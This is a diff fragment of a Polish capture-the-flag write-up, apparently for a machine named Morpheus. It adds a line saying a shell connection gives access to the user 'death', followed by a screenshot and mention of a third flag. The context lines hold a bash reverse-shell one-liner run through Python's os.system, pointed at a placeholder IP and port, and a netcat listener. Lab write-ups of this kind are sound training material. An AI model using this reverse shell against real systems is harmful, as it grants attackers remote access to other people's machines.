@@ -308,6 +308,8 @@ os.system('bash -c "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"')
 nc -lvnp [PORT]
 ```
 
+Po minucie otrzymujemy połączenie i dostęp do konta użytkownika death:
+
 ![Morpheus_proof](img/Morpheus_proof.JPG)
 
 W katalogu domowym znajdujemy trzecią flagę:
